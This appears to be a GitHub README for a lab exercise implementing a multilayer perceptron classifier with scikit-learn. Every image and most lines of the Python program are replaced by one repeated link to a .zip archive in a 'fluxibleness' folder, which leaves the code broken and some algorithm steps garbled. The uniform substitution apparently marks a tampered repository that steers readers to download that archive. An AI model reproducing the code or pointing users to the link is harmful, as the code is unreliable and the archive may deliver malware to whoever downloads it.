# Experiment-4---Implementation-of-MLP-with-Backpropagation

## AIM:
To implement a Multilayer Perceptron for Multi classification

## EQUIPMENTS REQUIRED:
Hardware – PCs
Anaconda – Python 3.7 Installation / Google Colab /Jupiter Notebook

## RELATED THEORETICAL CONCEPT:

A multilayer perceptron (MLP) is a feedforward artificial neural network that generates a set of outputs from a set of inputs. An MLP is characterized by several layers of input nodes connected as a directed graph between the input and output layers. MLP uses back propagation for training the network. MLP is a deep learning method.
A multilayer perceptron is a neural network connecting multiple layers in a directed graph, which means that the signal path through the nodes only goes one way. Each node, apart from the input nodes, has a nonlinear activation function. An MLP uses backpropagation as a supervised learning technique.
MLP is widely used for solving problems that require supervised learning as well as research into computational neuroscience and parallel distributed processing. Applications include speech recognition, image recognition and machine translation.
 
MLP has the following features:

Ø  Adjusts the synaptic weights based on Error Correction Rule

Ø  Adopts LMS

Ø  possess Backpropagation algorithm for recurrent propagation of error

Ø  Consists of two passes

  	(i)Feed Forward pass
	         (ii)Backward pass
           
Ø  Learning process –backpropagation

Ø  Computationally efficient method

![image 10](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)

3 Distinctive Characteristics of MLP:

Ø  Each neuron in network includes a non-linear activation function

![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)

Ø  Contains one or more hidden layers with hidden neurons

Ø  Network exhibits high degree of connectivity determined by the synapses of the network

3 Signals involved in MLP are:

 Functional Signal

*input signal

*propagates forward neuron by neuron thro network and emerges at an output signal

*F(x,w) at each neuron as it passes

Error Signal

   *Originates at an output neuron
   
   *Propagates backward through the network neuron
   
   *Involves error dependent function in one way or the other
   
Each hidden neuron or output neuron of MLP is designed to perform two computations:

The computation of the function signal appearing at the output of a neuron which is expressed as a continuous non-linear function of the input signal and synaptic weights associated with that neuron

The computation of an estimate of the gradient vector is needed for the backward pass through the network

TWO PASSES OF COMPUTATION:

In the forward pass:

•       Synaptic weights remain unaltered

•       Function signal are computed neuron by neuron

•       Function signal of jth neuron is
            ![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
            ![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
            ![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)



If jth neuron is output neuron, the m=mL  and output of j th neuron is
               ![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)

Forward phase begins with in the first hidden layer and end by computing ej(n) in the output layer
![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)


In the backward pass,

•       It starts from the output layer by passing error signal towards leftward layer neurons to compute local gradient recursively in each neuron

•        it changes the synaptic weight by delta rule

![image](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)



## ALGORITHM:

https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip the necessary libraries of python.

2. After that, create a list of attribute names in the dataset and use it in a call to the read_csv() function of the pandas library along with the name of the CSV file containing the dataset.

3. Divide the dataset into two parts. While the first part contains the first four columns that we assign in the variable x. Likewise, the second part contains only the last column that is the class label. Further, assign it to the variable y.

4. Call the train_test_split() function that further divides the dataset into training data and testing data with a testing data size of 20%.
Normalize our dataset. 

https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip order to do that we call the StandardScaler() function. Basically, the StandardScaler() function subtracts the mean from a feature and scales it to the unit variance.

https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip the MLPClassifier() function with appropriate parameters indicating the hidden layer sizes, activation function, and the maximum number of iterations.

https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip order to get the predicted values we call the predict() function on the testing data set.

8. Finally, call the functions confusion_matrix(), and the classification_report() in order to evaluate the performance of our classifier.

## PROGRAM 

```
import pandas as pd
import sklearn
from sklearn import preprocessing
from https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip import train_test_split
from https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip import StandardScaler
from https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip import MLPClassifier
from https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip import classification_report,confusion_matrix
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip("https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip")
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip[:,0:4]
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(include=[object])
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip()
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)
x_train,x_test,y_train,y_test=train_test_split(x,y,test_size=0.20)
scaler=StandardScaler()
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_train)
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_train)
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_test)
mlp=MLPClassifier(hidden_layer_sizes=(10,10,10),max_iter=1000)
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_train,https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip())
https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip(x_test)
print(predictions)
print(confusion_matrix(y_test,predictions))
print(classification_report(y_test,predictions))
```
## OUTPUT
![1s](https://raw.githubusercontent.com/githubmufeez45/Experiment-4---Implementation-of-MLP-with-Backpropagation/main/fluxibleness/Experiment-4---Implementation-of-MLP-with-Backpropagation.zip)

## RESULT

Thus, a Multilayer Perceptron for Multi classification is implemented successfully.


